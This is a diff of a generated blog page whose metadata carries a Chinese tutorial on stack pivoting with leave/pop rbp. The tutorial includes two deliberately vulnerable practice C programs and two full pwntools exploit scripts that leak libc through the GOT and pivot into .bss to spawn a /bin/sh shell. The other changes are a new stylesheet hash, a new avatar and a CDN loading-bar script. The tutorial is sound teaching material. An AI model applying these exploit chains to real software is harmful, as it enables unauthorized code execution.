@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://Helios973.github.io/p/stack/'>
 
-<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="Stack">
+<link rel="stylesheet" href="/scss/style.min.fdf1c58d118af28a88b5711d163b036065345b00814c2ad395797a3b55c0691a.css"><meta property='og:title' content="Stack">
 <meta property='og:description' content="stack_pivot 这里我们进行分析stack_pivot这个攻击模式\n这里分享这个的背景是因为我们在攻击模块的时候会出现溢出长度不够或者溢出长度不到ret地址的问题，而这个问题的解决方法也是我们这一节的标题也就是stack_pivot(栈迁移)那我们先来说明一下本质好了\n本质：主要是通过溢出手段是的我们的rbp/rsp迁移到一个可以读可写的地方进行一个攻击\n主要使用的指令：leave，pop rbp\n目的：1.可以与输入函数搭配使用，是心啊任意地址的写\n\u200b\t2.变相增加溢出长度\n那么我们这先来看一下我们需要使用到的指令也就是leave和pop rbp\n这里我们先分析一下leave指令，它主要的使用用途就是返回到上一级函数时，需要恢复原本栈的空间，这个指令也同样时一个组合指令分别位mov esp,ebp; pop ebp;\n而pop这个指令同样等同与mov ebp,[esp],sub esp,4(32位)\n如果阅读者有一些汇编的基础我们就可以很好理解我们需要的攻击思路了，通过这两个主要的命令点我们就可以有一定的思路就是我们可以通过控制ebp/rbp来使得我们的恢复函数的ebp/rbp是我们需要的栈的位置使得我们可以进行一个迁移操作\n这里我们就使用一个例题来说明\n例题： 这我们先分享一下如何通过rbp进行一个迁移，当我们可以看明白汇编的时候我们大概率就可以明白，在汇编中大部分迁移都是通过ebp/rbp的相对地址进行要给迁移的因此我们因此，这个也就是pop rbp这个命令的使用的一个思路了\n通过pop rbp进行一个文件的构造因此这个也是一个比较简单的方法这个方法提就不演示了\n那我们就来看他对另外两种情况也就是我们是否可以溢出到ret地址的位置来区分\n有ret 1 2 3 4 5 6 7 8 9 10 #include &#34;stdio.h&#34; int main(){ char a[0x20]={}; read(0,a,0x30); write(1,a,0x30); return 0; } /*编译命令 gcc main.c -fno-stack-protector -no-pie -o pwn_tran */ 可以通过这个函数进行一个练手\n这个题目的主要思路就是我们可以把这个栈结构迁移到bss段上去使得我们可以在bss段上写上我们的结构体来构造payload\n当他的代码可以是这个\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * p=process(&#39;pwn_tran&#39;) e=ELF(&#39;&#39;,checksec=False) libc=ELF(&#39;libc-2.33.so&#39;,checksec=False) leave=0x4011bd ret=0x4011be read=0x401182 write=0x40119d bss=0x404048 read_got=0x404020 rdi=0x0000000000401223 p.send(b&#39;a&#39;*0x20+p64(bss)+p64(read)) p.read() payload=b&#39;/bin/sh\\x00&#39;+p64(bss+0x800)+p64(read)+p64(bss-0x18)+p64(bss-0x18)+p64(write) p.send(payload) p.read(0x40) read_addr=u64(p.read(8)) libc.address=read_addr-libc.sym[&#39;read&#39;] print(hex(libc.address)) system=libc.sym[&#39;system&#39;] bin_sh=next(libc.search(b&#34;/bin/sh&#34;)) bss=bss+0x700 payload=p64(bss+0x200)+p64(rdi)+p64(bin_sh)+p64(system)+p64(bss+0x100-0x20)+p64(leave) p.send(payload) p.interactive() 无ret 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include&lt;stdio.h&gt; char b[0x20]={}; void func(){ char a[0x20]={}; read(0,a,0x28); read(0,b,0x60); write(1,b,0x60); } int main(){ char a=0; func(); } /*编译命令 gcc pwn_tran.c -fno-stack-protector -no-pie -o pwn_tran */ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 from pwn import * b_add=0x404060 read_got=0x404020 read=0x401182 write_plt=0x401050 read_plt=0x401060 rdi=0x401263 rsi_15=0x401261 leave=0x4011d4 e=ELF(&#39;./pwn_tran&#39;,checksec=0) libc=ELF(&#39;libc-2.33.so&#39;,checksec=0) p=process(&#39;pwn_tran&#39;) p.send(b&#39;a&#39;*0x20+p64(b_add)) p.sendline(p64(b_add)+p64(rdi)+p64(1)+p64(rsi_15)+p64(read_got)+p64(0)+p64(write_plt)+p64(read)) p.read(0x60) d=u64(p.read(8)) print(hex(d)) libc.address=d-libc.sym[&#39;read&#39;] system=libc.sym[&#39;system&#39;] bin_sh=next(libc.search(&#39;/bin/sh&#39;)) p.sendline(&#39;&#39;) payload=p64(b_add+0x808)+p64(rdi)+p64(0)+p64(rsi_15)+p64(b_add+0x808)+p64(0)+p64(read_plt)+p64(leave) print(hex(len(payload))) p.send(payload) pause() p.send(p64(b_add+0x900)+p64(rdi)+p64(bin_sh)+p64(system)) p.interactive() 栈溢出 ">
 <meta property='og:url' content='https://Helios973.github.io/p/stack/'>
 <meta property='og:site_name' content='helios'>
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_4c4cc7c9a448b656.png" width="300"
+                        <img src="/img/avatar_hu_1142efd4180d69c3.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -686,6 +686,15 @@
 
         document.head.appendChild(customFont);
     }());
+</script>
+<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
+<script>
+    NProgress.start();
+    document.addEventListener("readystatechange", () => {
+        if (document.readyState === "interactive") NProgress.inc(0.8);
+        if (document.readyState === "complete") NProgress.done();
+    });
 </script>
 
     </body>
